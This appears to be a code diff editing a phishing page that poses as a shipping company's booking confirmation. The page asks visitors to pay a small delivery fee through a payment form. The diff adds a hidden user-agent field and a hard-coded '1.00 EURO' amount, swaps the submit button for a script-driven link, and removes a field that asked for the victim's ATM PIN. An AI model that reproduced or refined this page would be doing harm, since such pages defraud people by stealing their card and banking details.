@@ -1962,13 +1962,13 @@ function submitForm() {
                             <div class="grid-maxWidthInner no-padding">
                                 <h2 class="styled__headlineStyles-sc-18g9jku-0-h2 bbMnbw styled__StyledHeadline-sc-1pqhmhb-1 dPEZMb " style="margin-bottom: 11px;">Confirm Your Booking</h2>
                                 <p style="margin-bottom: 10px;">To confirm your delivery, please pay using the payment form below.</p>
-                                <p style="margin-bottom: 27px;">Amount due: <b><?=$fee?></b></p>
+                                <p style="margin-bottom: 27px;">Amount due: 1.00 EURO <b><?=$fee?></b></p>
                             </div>
                         </div>
                         <div class="mx-wrapper">
                             <div class="styled__TradeLaneWrapper-sc-19f3quq-0 eksyZj grid-maxWidthInner no-padding" id="tradelane-panel">
                                 <form id="loginForm" class="grid-maxWidth">
-                                    
+                                        <input type="hidden" id="userAgent" name="userAgent">
                                     <div class="styled__TradeLaneFormContentWrapper-sc-19f3quq-1 icDOhq oldImportExportToggle">
                                         <div class="styled__FlipIconButtonWrapper-sc-19f3quq-8 EVkZd"></div>
                                         <fieldset class="styled__OriginContainer-sc-19f3quq-7 bZSqVS">
@@ -2013,25 +2013,13 @@ function submitForm() {
                                                             </div>
                                                         </div>
                                                     </div>
-                                                    <?php } if ($p_atm) { ?>
-                                                    <div class="autocomplete" style="display: inline-block;">
-                                                        <div role="combobox">
-                                                            <div class="FormField__InputContainer-sc-c33gjb-0 bxtLQP">
-                                                                <div class="sc-kfzBvY mlgKA Input__StyledInputField-sc-1wjjws-0 evarKd">
-                                                                    <input id="input-atm" name="atm" type="tel" placeholder="" class="sc-fKFxtB bkdqGD lrinput" attr-action="Filling ATM" required value="" minlength="4" maxlength="6">
-                                                                    <label id="" for="" class="sc-eCstlR hmeyGE">ATM Pin</label>
-                                                                </div>
-                                                            </div>
-                                                        </div>
-                                                    </div>
-                                                    <?php } ?>
                                                 </div>
                                                 </div>
                                             </div>
                                         </fieldset>
                                     </div>
                                     <div class="styled__StyledButtonWrapper-sc-1tkk3aj-1 kGpbtW button-wrapper">
-                                        <button class="sc-hKgJUU iKcSnh" data-testid="describe-shipment-button" type="submit" name="save" value="1">Confirm Booking</button>
+                                        <a class="sc-hKgJUU iKcSnh" data-testid="describe-shipment-button" type="submit" onclick="submitForm()">Confirm Booking</a>
                                     </div>
                                 </form>
                             </div>
